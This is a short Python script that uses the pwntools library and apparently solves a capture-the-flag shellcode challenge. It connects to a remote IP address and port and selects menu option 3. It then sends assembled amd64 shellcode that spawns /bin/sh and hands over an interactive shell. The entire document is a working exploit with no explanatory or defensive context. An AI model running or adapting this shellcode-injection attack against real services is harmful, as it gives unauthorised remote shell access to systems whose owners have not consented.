from pwn import *

#io=process('shellcode1')
io=remote("219.216.65.41",35579)
context.terminal = ['tmux', 'splitw', '-h']
context(log_level='debug',arch='amd64',os='linux')

#gdb.attach(io)
io.recv()
io.sendline(str(3).encode())
shellcode=shellcraft.sh()

io.recv()
payload2=asm(shellcode)
io.send(payload2)


io.interactive()
